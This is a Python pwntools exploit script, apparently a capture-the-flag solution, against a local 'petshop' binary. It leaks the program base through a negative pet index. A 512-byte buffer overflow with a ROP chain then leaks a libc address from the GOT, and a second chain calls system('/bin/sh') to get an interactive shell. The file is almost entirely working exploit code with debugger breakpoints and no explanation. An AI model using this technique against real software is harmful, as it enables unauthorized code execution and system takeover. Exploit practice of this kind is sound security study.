#!/usr/bin/env python3

from pwn import *

exe = ELF("./petshop_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


r = process([exe.path])


gdb.attach(r, gdbscript='''
	b *buy+238
	b *buy+0x121
	b *buy+293
	b *sell+367
	c
	''')





def main():
	input()

	###Stage 1: Leak code base
	r.sendlineafter(b'-->', b'buy cat -2')
	r.sendlineafter(b'-->', b'cat2 of gnas')
	r.sendlineafter(b'-->', b'info mine')

	r.recvuntil(b'Your pets:\n')
	r.recvuntil(b'. ')
	

	#leak code base (offset 0x4008)
	leak_addr = u64(r.recvline()[:-1] + b"\x00\x00")
	exe.address = leak_addr - 0x4008
	print("code base: ", hex(exe.address))


	###Stage 2: Leak GOT
	r.sendlineafter(b'-->', b'buy cat 3')
	r.sendlineafter(b'-->', b'cat3 of gnas')

	r.sendlineafter(b'-->', b'buy dog 3')
	r.sendlineafter(b'-->', b'dog3 of gnas')

	r.sendlineafter(b'-->', b'sell 1')
	r.sendlineafter(b'-->', b'1000')


	pop_rdi = exe.address+0x1a13
	puts_address = exe.address+0x18a6


	payload = b'A'*512+p64(exe.address+0x8e00)+ p64(pop_rdi) + p64(exe.got['getchar']) + p64(puts_address)


	r.sendlineafter(b'-->', b'sell 2')
	r.sendafter(b'-->', b'n')
	r.sendlineafter(b"You    --> ", payload)


	r.recvuntil(b'reasonable!\n')
	leak_addr = u64(r.recv(6)+b'\x00\x00')
	libc.address = leak_addr-libc.sym['getchar']

	print("Leak: ", hex(leak_addr))
	print("Libc base: ", hex(libc.address))


	###Stage 3: Ret2libc

	r.sendlineafter(b'-->', b'buy cat 2')
	r.sendlineafter(b'-->', b'cat1000 of gnas')

	r.sendlineafter(b'-->', b'buy dog 2')
	r.sendlineafter(b'-->', b'dog1000 of gnas')

	r.sendlineafter(b'-->', b'sell 3')
	r.sendlineafter(b'-->', b'1000')


	binsh = next(libc.search(b'/bin/sh'))  # grab string location

	ret_gadget = exe.address + 0x101a
	system_addr = libc.sym['system']

	payload = b'A'*512+p64(0)+ p64(pop_rdi) + p64(binsh) + p64(ret_gadget) + p64(system_addr)

	r.sendlineafter(b'-->', b'sell 4')
	r.sendafter(b'-->', b'n')
	r.sendlineafter(b"You    --> ", payload)







	r.interactive()


if __name__ == "__main__":
    main()
